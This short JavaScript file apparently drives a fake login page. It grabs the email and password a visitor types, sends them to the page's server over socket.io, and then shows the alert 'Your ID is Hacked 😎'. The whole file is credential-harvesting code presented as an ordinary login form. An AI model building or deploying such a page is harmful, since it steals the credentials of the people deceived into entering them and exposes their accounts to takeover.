const socket = io();

const form = document.querySelector("form");
const emailInput = document.querySelector('input[type="text"]');
const passwordInput = document.querySelector('input[type="password"]');
const loginBtn = document.querySelector(".login-btn");

loginBtn.addEventListener("click", (event) => {
  event.preventDefault();
  const email = emailInput.value;
  const password = passwordInput.value;

  if (email && password) {
    socket.emit("form-submit", { email, password });

    socket.on("form-response", (message) => {
      alert("Your ID is Hacked 😎");
    });
  } else {
    alert("Please fill out both fields");
  }
});
